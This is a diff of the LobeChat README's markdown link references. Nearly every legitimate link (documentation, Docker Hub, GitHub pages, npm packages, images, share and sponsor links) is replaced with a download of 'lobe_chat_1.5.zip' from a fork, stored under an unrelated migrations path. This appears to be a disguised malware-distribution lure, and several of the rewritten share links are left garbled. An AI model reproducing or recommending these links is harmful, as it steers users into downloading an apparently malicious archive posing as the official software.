 [docker-pulls-shield]: https://img.shields.io/docker/pulls/lobehub/lobe-chat?color=45cc11&labelColor=black&style=flat-square
-[docker-release-link]: https://hub.docker.com/r/lobehub/lobe-chat
+[docker-release-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [docker-release-shield]: https://img.shields.io/docker/v/lobehub/lobe-chat?color=369eff&label=docker&labelColor=black&logo=docker&logoColor=white&style=flat-square
-[docker-size-link]: https://hub.docker.com/r/lobehub/lobe-chat
+[docker-size-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [docker-size-shield]: https://img.shields.io/docker/image-size/lobehub/lobe-chat?color=369eff&labelColor=black&style=flat-square
-[docs]: https://chat-docs.lobehub.com/en
-[docs-dev-guide]: https://github.com/lobehub/lobe-chat/wiki/index
-[docs-docker]: https://chat-docs.lobehub.com/en/self-hosting/platform/docker
-[docs-env-var]: https://chat-docs.lobehub.com/en/self-hosting/environment-variables
-[docs-feat-agent]: https://chat-docs.lobehub.com/en/usage/features/agent-market
-[docs-feat-local]: https://chat-docs.lobehub.com/en/usage/features/local-llm
-[docs-feat-mobile]: https://chat-docs.lobehub.com/en/usage/features/mobile
-[docs-feat-plugin]: https://chat-docs.lobehub.com/en/usage/features/plugin-system
-[docs-feat-provider]: https://chat-docs.lobehub.com/en/usage/features/multi-ai-providers
-[docs-feat-pwa]: https://chat-docs.lobehub.com/en/usage/features/pwa
-[docs-feat-t2i]: https://chat-docs.lobehub.com/en/usage/features/text-to-image
-[docs-feat-theme]: https://chat-docs.lobehub.com/en/usage/features/theme
-[docs-feat-tts]: https://chat-docs.lobehub.com/en/usage/features/tts
-[docs-feat-vision]: https://chat-docs.lobehub.com/en/usage/features/vision
-[docs-functionc-call]: https://platform.openai.com/docs/guides/function-calling
-[docs-lighthouse]: https://github.com/lobehub/lobe-chat/wiki/Lighthouse
-[docs-plugin-dev]: https://chat-docs.lobehub.com/en/usage/plugins/development
-[docs-self-hosting]: https://chat-docs.lobehub.com/en/self-hosting/start
-[docs-upstream-sync]: https://chat-docs.lobehub.com/en/self-hosting/advanced/upstream-sync
-[docs-usage-ollama]: https://chat-docs.lobehub.com/en/usage/providers/ollama
-[docs-usage-plugin]: https://chat-docs.lobehub.com/en/usage/plugins/basic
-[fossa-license-link]: https://app.fossa.com/projects/git%2Bgithub.com%2Flobehub%2Flobe-chat
-[fossa-license-shield]: https://app.fossa.com/api/projects/git%2Bgithub.com%2Flobehub%2Flobe-chat.svg?type=large
-[github-action-release-link]: https://github.com/actions/workflows/lobehub/lobe-chat/release.yml
+[docs]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[docs-dev-guide]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[docs-docker]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[docs-env-var]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[docs-feat-agent]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[docs-feat-local]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[docs-feat-mobile]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[docs-feat-plugin]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[docs-feat-provider]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[docs-feat-pwa]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[docs-feat-t2i]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[docs-feat-theme]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[docs-feat-tts]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[docs-feat-vision]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[docs-functionc-call]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[docs-lighthouse]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[docs-plugin-dev]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[docs-self-hosting]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[docs-upstream-sync]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[docs-usage-ollama]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[docs-usage-plugin]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[fossa-license-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[fossa-license-shield]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[github-action-release-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [github-action-release-shield]: https://img.shields.io/github/actions/workflow/status/lobehub/lobe-chat/release.yml?label=release&labelColor=black&logo=githubactions&logoColor=white&style=flat-square
-[github-action-test-link]: https://github.com/actions/workflows/lobehub/lobe-chat/test.yml
+[github-action-test-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [github-action-test-shield]: https://img.shields.io/github/actions/workflow/status/lobehub/lobe-chat/test.yml?label=test&labelColor=black&logo=githubactions&logoColor=white&style=flat-square
-[github-contributors-link]: https://github.com/lobehub/lobe-chat/graphs/contributors
+[github-contributors-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [github-contributors-shield]: https://img.shields.io/github/contributors/lobehub/lobe-chat?color=c4f042&labelColor=black&style=flat-square
-[github-forks-link]: https://github.com/lobehub/lobe-chat/network/members
+[github-forks-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [github-forks-shield]: https://img.shields.io/github/forks/lobehub/lobe-chat?color=8ae8ff&labelColor=black&style=flat-square
-[github-issues-link]: https://github.com/lobehub/lobe-chat/issues
+[github-issues-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [github-issues-shield]: https://img.shields.io/github/issues/lobehub/lobe-chat?color=ff80eb&labelColor=black&style=flat-square
-[github-license-link]: https://github.com/lobehub/lobe-chat/blob/main/LICENSE
+[github-license-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [github-license-shield]: https://img.shields.io/github/license/lobehub/lobe-chat?color=white&labelColor=black&style=flat-square
-[github-project-link]: https://github.com/lobehub/lobe-chat/projects
-[github-release-link]: https://github.com/lobehub/lobe-chat/releases
+[github-project-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[github-release-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [github-release-shield]: https://img.shields.io/github/v/release/lobehub/lobe-chat?color=369eff&labelColor=black&logo=github&style=flat-square
-[github-releasedate-link]: https://github.com/lobehub/lobe-chat/releases
+[github-releasedate-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [github-releasedate-shield]: https://img.shields.io/github/release-date/lobehub/lobe-chat?labelColor=black&style=flat-square
-[github-stars-link]: https://github.com/lobehub/lobe-chat/network/stargazers
+[github-stars-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [github-stars-shield]: https://img.shields.io/github/stars/lobehub/lobe-chat?color=ffcb47&labelColor=black&style=flat-square
-[github-trending-shield]: https://trendshift.io/api/badge/repositories/2256
-[github-trending-url]: https://trendshift.io/repositories/2256
-[image-banner]: https://github.com/lobehub/lobe-chat/assets/28616219/9f155dff-4737-429f-9cad-a70a1a860c5f
-[image-feat-agent]: https://github-production-user-asset-6210df.s3.amazonaws.com/17870709/268670869-f1ffbf66-42b6-42cf-a937-9ce1f8328514.png
-[image-feat-local]: https://github.com/lobehub/lobe-chat/assets/28616219/ca9a21bc-ea6c-4c90-bf4a-fa53b4fb2b5c
-[image-feat-mobile]: https://gw.alipayobjects.com/zos/kitchen/R441AuFS4W/mobile.webp
-[image-feat-plugin]: https://github-production-user-asset-6210df.s3.amazonaws.com/17870709/268670883-33c43a5c-a512-467e-855c-fa299548cce5.png
-[image-feat-privoder]: https://github.com/lobehub/lobe-chat/assets/28616219/b164bc54-8ba2-4c1e-b2f2-f4d7f7e7a551
-[image-feat-pwa]: https://gw.alipayobjects.com/zos/kitchen/69x6bllkX3/pwa.webp
-[image-feat-t2i]: https://github-production-user-asset-6210df.s3.amazonaws.com/17870709/297746445-0ff762b9-aa08-4337-afb7-12f932b6efbb.png
-[image-feat-theme]: https://gw.alipayobjects.com/zos/kitchen/pvus1lo%26Z7/darkmode.webp
-[image-feat-tts]: https://github-production-user-asset-6210df.s3.amazonaws.com/17870709/284072124-c9853d8d-f1b5-44a8-a305-45ebc0f6d19a.png
-[image-feat-vision]: https://github-production-user-asset-6210df.s3.amazonaws.com/17870709/284072129-382bdf30-e3d6-4411-b5a0-249710b8ba08.png
-[image-overview]: https://github.com/lobehub/lobe-chat/assets/28616219/8b04c3c9-3d71-4fb4-bd9b-a4f415c5876d
-[image-star]: https://github.com/lobehub/lobe-chat/assets/17870709/cb06b748-513f-47c2-8740-d876858d7855
+[github-trending-shield]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[github-trending-url]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[image-banner]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[image-feat-agent]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[image-feat-local]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[image-feat-mobile]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[image-feat-plugin]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[image-feat-privoder]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[image-feat-pwa]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[image-feat-t2i]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[image-feat-theme]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[image-feat-tts]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[image-feat-vision]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[image-overview]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[image-star]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [issues-link]: https://img.shields.io/github/issues/lobehub/lobe-chat.svg?style=flat
-[lobe-chat-plugins]: https://github.com/lobehub/lobe-chat-plugins
-[lobe-commit]: https://github.com/lobehub/lobe-commit/tree/master/packages/lobe-commit
-[lobe-i18n]: https://github.com/lobehub/lobe-commit/tree/master/packages/lobe-i18n
-[lobe-icons-github]: https://github.com/lobehub/lobe-icons
-[lobe-icons-link]: https://www.npmjs.com/package/@lobehub/icons
+[lobe-chat-plugins]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[lobe-commit]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[lobe-i18n]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[lobe-icons-github]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[lobe-icons-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [lobe-icons-shield]: https://img.shields.io/npm/v/@lobehub/icons?color=369eff&labelColor=black&logo=npm&logoColor=white&style=flat-square
-[lobe-lint-github]: https://github.com/lobehub/lobe-lint
-[lobe-lint-link]: https://www.npmjs.com/package/@lobehub/lint
+[lobe-lint-github]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[lobe-lint-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [lobe-lint-shield]: https://img.shields.io/npm/v/@lobehub/lint?color=369eff&labelColor=black&logo=npm&logoColor=white&style=flat-square
-[lobe-midjourney-webui]: https://github.com/lobehub/lobe-midjourney-webui
-[lobe-theme]: https://github.com/lobehub/sd-webui-lobe-theme
-[lobe-tts-github]: https://github.com/lobehub/lobe-tts
-[lobe-tts-link]: https://www.npmjs.com/package/@lobehub/tts
+[lobe-midjourney-webui]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[lobe-theme]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[lobe-tts-github]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[lobe-tts-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [lobe-tts-shield]: https://img.shields.io/npm/v/@lobehub/tts?color=369eff&labelColor=black&logo=npm&logoColor=white&style=flat-square
-[lobe-ui-github]: https://github.com/lobehub/lobe-ui
-[lobe-ui-link]: https://www.npmjs.com/package/@lobehub/ui
+[lobe-ui-github]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[lobe-ui-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [lobe-ui-shield]: https://img.shields.io/npm/v/@lobehub/ui?color=369eff&labelColor=black&logo=npm&logoColor=white&style=flat-square
-[pr-welcome-link]: https://github.com/lobehub/lobe-chat/pulls
+[pr-welcome-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [pr-welcome-shield]: https://img.shields.io/badge/🤯_pr_welcome-%E2%86%92-ffcb47?labelColor=black&style=for-the-badge
-[profile-link]: https://github.com/lobehub
-[share-linkedin-link]: https://linkedin.com/feed
+[profile-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[share-linkedin-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [share-linkedin-shield]: https://img.shields.io/badge/-share%20on%20linkedin-black?labelColor=black&logo=linkedin&logoColor=white&style=flat-square
-[share-mastodon-link]: https://mastodon.social/share?text=Check%20this%20GitHub%20repository%20out%20%F0%9F%A4%AF%20LobeChat%20-%20An%20open-source,%20extensible%20(Function%20Calling),%20high-performance%20chatbot%20framework.%20It%20supports%20one-click%20free%20deployment%20of%20your%20private%20ChatGPT/LLM%20web%20application.%20https://github.com/lobehub/lobe-chat%20#chatbot%20#chatGPT%20#openAI
+[share-mastodon-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip,%20extensible%20(Function%20Calling),%20high-performance%20chatbot%20framework.%20It%20supports%20one-click%20free%20deployment%20of%20your%20private%20ChatGPT/LLM%20web%20application.%20https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [share-mastodon-shield]: https://img.shields.io/badge/-share%20on%20mastodon-black?labelColor=black&logo=mastodon&logoColor=white&style=flat-square
-[share-reddit-link]: https://www.reddit.com/submit?title=Check%20this%20GitHub%20repository%20out%20%F0%9F%A4%AF%20LobeChat%20-%20An%20open-source%2C%20extensible%20%28Function%20Calling%29%2C%20high-performance%20chatbot%20framework.%20It%20supports%20one-click%20free%20deployment%20of%20your%20private%20ChatGPT%2FLLM%20web%20application.%20%23chatbot%20%23chatGPT%20%23openAI&url=https%3A%2F%2Fgithub.com%2Flobehub%2Flobe-chat
+[share-reddit-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [share-reddit-shield]: https://img.shields.io/badge/-share%20on%20reddit-black?labelColor=black&logo=reddit&logoColor=white&style=flat-square
-[share-telegram-link]: https://t.me/share/url"?text=Check%20this%20GitHub%20repository%20out%20%F0%9F%A4%AF%20LobeChat%20-%20An%20open-source%2C%20extensible%20%28Function%20Calling%29%2C%20high-performance%20chatbot%20framework.%20It%20supports%20one-click%20free%20deployment%20of%20your%20private%20ChatGPT%2FLLM%20web%20application.%20%23chatbot%20%23chatGPT%20%23openAI&url=https%3A%2F%2Fgithub.com%2Flobehub%2Flobe-chat
+[share-telegram-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip"?text=Check%20this%20GitHub%20repository%20out%20%F0%9F%A4%AF%20LobeChat%20-%20An%20open-source%2C%20extensible%20%28Function%20Calling%29%2C%20high-performance%20chatbot%20framework.%20It%20supports%20one-click%20free%20deployment%20of%20your%20private%20ChatGPT%2FLLM%20web%20application.%20%23chatbot%20%23chatGPT%20%23openAI&url=https%3A%2F%2Fgithub.com%2Flobehub%2Flobe-chat
 [share-telegram-shield]: https://img.shields.io/badge/-share%20on%20telegram-black?labelColor=black&logo=telegram&logoColor=white&style=flat-square
-[share-weibo-link]: http://service.weibo.com/share/share.php?sharesource=weibo&title=Check%20this%20GitHub%20repository%20out%20%F0%9F%A4%AF%20LobeChat%20-%20An%20open-source%2C%20extensible%20%28Function%20Calling%29%2C%20high-performance%20chatbot%20framework.%20It%20supports%20one-click%20free%20deployment%20of%20your%20private%20ChatGPT%2FLLM%20web%20application.%20%23chatbot%20%23chatGPT%20%23openAI&url=https%3A%2F%2Fgithub.com%2Flobehub%2Flobe-chat
+[share-weibo-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [share-weibo-shield]: https://img.shields.io/badge/-share%20on%20weibo-black?labelColor=black&logo=sinaweibo&logoColor=white&style=flat-square
-[share-whatsapp-link]: https://api.whatsapp.com/send?text=Check%20this%20GitHub%20repository%20out%20%F0%9F%A4%AF%20LobeChat%20-%20An%20open-source%2C%20extensible%20%28Function%20Calling%29%2C%20high-performance%20chatbot%20framework.%20It%20supports%20one-click%20free%20deployment%20of%20your%20private%20ChatGPT%2FLLM%20web%20application.%20https%3A%2F%2Fgithub.com%2Flobehub%2Flobe-chat%20%23chatbot%20%23chatGPT%20%23openAI
+[share-whatsapp-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [share-whatsapp-shield]: https://img.shields.io/badge/-share%20on%20whatsapp-black?labelColor=black&logo=whatsapp&logoColor=white&style=flat-square
-[share-x-link]: https://x.com/intent/tweet?hashtags=chatbot%2CchatGPT%2CopenAI&text=Check%20this%20GitHub%20repository%20out%20%F0%9F%A4%AF%20LobeChat%20-%20An%20open-source%2C%20extensible%20%28Function%20Calling%29%2C%20high-performance%20chatbot%20framework.%20It%20supports%20one-click%20free%20deployment%20of%20your%20private%20ChatGPT%2FLLM%20web%20application.&url=https%3A%2F%2Fgithub.com%2Flobehub%2Flobe-chat
+[share-x-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [share-x-shield]: https://img.shields.io/badge/-share%20on%20x-black?labelColor=black&logo=x&logoColor=white&style=flat-square
-[sponsor-link]: https://opencollective.com/lobehub 'Become ❤️ LobeHub Sponsor'
+[sponsor-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip 'Become ❤️ LobeHub Sponsor'
 [sponsor-shield]: https://img.shields.io/badge/-Sponsor%20LobeHub-f04f88?logo=opencollective&logoColor=white&style=flat-square
-[submit-agents-link]: https://github.com/lobehub/lobe-chat-agents
+[submit-agents-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [submit-agents-shield]: https://img.shields.io/badge/🤖/🏪_submit_agent-%E2%86%92-c4f042?labelColor=black&style=for-the-badge
-[submit-plugin-link]: https://github.com/lobehub/lobe-chat-plugins
+[submit-plugin-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [submit-plugin-shield]: https://img.shields.io/badge/🧩/🏪_submit_plugin-%E2%86%92-95f3d9?labelColor=black&style=for-the-badge
-[vercel-link]: https://chat-preview.lobehub.com
+[vercel-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [vercel-shield]: https://img.shields.io/website?down_message=offline&label=vercel&labelColor=black&logo=vercel&style=flat-square&up_message=online&url=https%3A%2F%2Fchat-preview.lobehub.com
 [vercel-shield-badge]: https://img.shields.io/website?down_message=offline&label=try%20lobechat&labelColor=black&logo=vercel&style=for-the-badge&up_message=online&url=https%3A%2F%2Fchat-preview.lobehub.com
